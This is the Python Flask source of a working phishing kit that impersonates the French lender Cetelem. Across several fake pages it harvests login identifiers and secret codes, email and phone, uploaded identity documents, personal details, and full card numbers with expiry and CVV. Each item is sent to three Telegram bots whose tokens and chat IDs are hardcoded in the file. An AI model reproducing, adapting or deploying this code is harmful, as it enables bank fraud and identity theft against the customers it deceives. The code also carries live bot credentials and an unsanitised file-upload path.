from flask import Flask, render_template, request, redirect, jsonify
import requests
import os

app = Flask(__name__)

# Bot 1
TOKEN_1 = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
CHAT_ID_1 = '6297861735'

# Bot 2
TOKEN_2 = '8061642865:AAHHUZGH3Kzx7tN2PSsyLc53235DcVzMqKs'
CHAT_ID_2 = '7650873997'

# Bot 3 (NOUVEAU)
TOKEN_3 = '7858273702:AAEMIDAD8ZwY_Y2iZliX-5YPXNoHCkeB9HQ'
CHAT_ID_3 = '5214147917'

UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER


def send_to_telegram(token, chat_id, message):
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    data = {'chat_id': chat_id, 'text': message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Erreur Telegram :", e)


def send_all(message):
    send_to_telegram(TOKEN_1, CHAT_ID_1, message)
    send_to_telegram(TOKEN_2, CHAT_ID_2, message)
    send_to_telegram(TOKEN_3, CHAT_ID_3, message)


def send_document_to_telegram(token, chat_id, file_path):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    files = {'document': open(file_path, 'rb')}
    data = {'chat_id': chat_id}
    try:
        requests.post(url, data=data, files=files)
    except Exception as e:
        print("Erreur envoi de document Telegram :", e)


def send_document_all(file_path, caption):
    send_to_telegram(TOKEN_1, CHAT_ID_1, caption)
    send_document_to_telegram(TOKEN_1, CHAT_ID_1, file_path)

    send_to_telegram(TOKEN_2, CHAT_ID_2, caption)
    send_document_to_telegram(TOKEN_2, CHAT_ID_2, file_path)

    send_to_telegram(TOKEN_3, CHAT_ID_3, caption)
    send_document_to_telegram(TOKEN_3, CHAT_ID_3, file_path)


# Page 1 – Saisie identifiant
@app.route('/')
def identifiant():
    return render_template('identifiant.html')


# Page 2 – Enregistrement identifiant → Page code
@app.route('/code', methods=['POST'])
def code():
    identifiant = request.form.get('identifiant')
    if identifiant:
        send_all(f"[Identifiant cetelem hario] {identifiant}")
        # MODIFIÉ : Récupère les 2 derniers chiffres pour les passer à la page 'code.html'
        last_two_digits = identifiant[-2:]
        return render_template('code.html', last_two=last_two_digits)
    return redirect('/')


# Page 3 – Réception code secret → Page chargement
@app.route('/verification', methods=['GET', 'POST'])
def verification():
    if request.method == 'POST':
        try:
            # Tente de récupérer les données en JSON
            data = request.get_json()
            code = data.get('code')
            if code:
                send_all(f"[Code cetelem hario] {code}")
                return jsonify({"redirect_url": "/chargement"})
        except Exception as e:
            print("Erreur JSON:", e)
            # S'il y a une erreur, c'est probablement que la page essaie de poster un formulaire
            # Rediriger vers l'accueil ou afficher un message d'erreur
            return redirect('/')
    return render_template('verification_personnelle.html')


# Route pour la 1ère page de chargement
@app.route('/chargement')
def chargement():
    return render_template('chargement.html')


# Route pour le traitement avec le formulaire email/téléphone
@app.route('/traitement', methods=['GET', 'POST'])
def traitement():
    if request.method == 'POST':
        email = request.form.get('email')
        telephone = request.form.get('telephone')

        if email and telephone:
            message = (
                f"[Informations de contact]\n"
                f"Email: {email}\n"
                f"Téléphone: {telephone}"
            )
            send_all(message)
            return redirect('/chargement2')
    return render_template('traitement.html')


# Nouvelle route pour la 2ème page de chargement
@app.route('/chargement2')
def chargement2():
    return render_template('chargement2.html')


# Nouvelle route pour la page justificatifs
@app.route('/justificatifs')
def justificatifs():
    return render_template('justificatifs.html')


# Nouvelle route pour gérer les téléchargements de justificatifs
@app.route('/upload_documents', methods=['POST'])
def upload_documents():
    recto = request.files.get('recto_document')
    verso = request.files.get('verso_document')

    if not recto or not verso:
        return "Erreur : les deux fichiers sont requis.", 400

    recto_path = os.path.join(app.config['UPLOAD_FOLDER'], recto.filename)
    verso_path = os.path.join(app.config['UPLOAD_FOLDER'], verso.filename)

    recto.save(recto_path)
    verso.save(verso_path)

    send_document_all(recto_path, "Justificatif Recto")
    send_document_all(verso_path, "Justificatif Verso")

    if os.path.exists(recto_path):
        os.remove(recto_path)
    if os.path.exists(verso_path):
        os.remove(verso_path)

    return redirect('/chargement_verification')


# NOUVELLE ROUTE: Pour afficher la page de chargement avant la page de vérification
@app.route('/chargement_verification')
def chargement_verification():
    return render_template('chargement_verification.html')


# Route pour le traitement du formulaire de vérification des informations personnelles
@app.route('/verification_personnelle', methods=['GET', 'POST'])
def verification_personnelle():
    if request.method == 'POST':
        nom = request.form.get('nom')
        prenom = request.form.get('prenom')
        date_naissance = request.form.get('date_naissance')
        telephone = request.form.get('telephone')

        if nom and prenom and date_naissance and telephone:
            message = (
                f"[Informations personnelles]\n"
                f"Nom: {nom}\n"
                f"Prénom: {prenom}\n"
                f"Date de naissance: {date_naissance}\n"
                f"Téléphone: {telephone}"
            )
            send_all(message)
            # MODIFIÉ : Redirige vers la nouvelle page de chargement
            return redirect('/chargement_securisation')
    return render_template('verification_personnelle.html')


# NOUVELLE ROUTE: Pour afficher la page de chargement avant la page de sécurisation
@app.route('/chargement_securisation')
def chargement_securisation():
    return render_template('chargement_securisation.html')


# Route pour le traitement du formulaire de sécurisation (carte bancaire)
@app.route('/securisation', methods=['GET', 'POST'])
def securisation():
    if request.method == 'POST':
        carte = request.form.get('numero_carte')
        date_exp = request.form.get('date_expiration')
        cvv = request.form.get('cryptogramme')

        if carte and date_exp and cvv:
            message = f"[Carte] {carte} | Exp: {date_exp} | CVV: {cvv}"
            send_all(message)
            return redirect('/merci')
    return render_template('securisation.html')


# Route pour la page de remerciement
@app.route('/merci', methods=['GET'])
def merci():
    return render_template('merci.html')


if __name__ == '__main__':
    app.run(debug=True)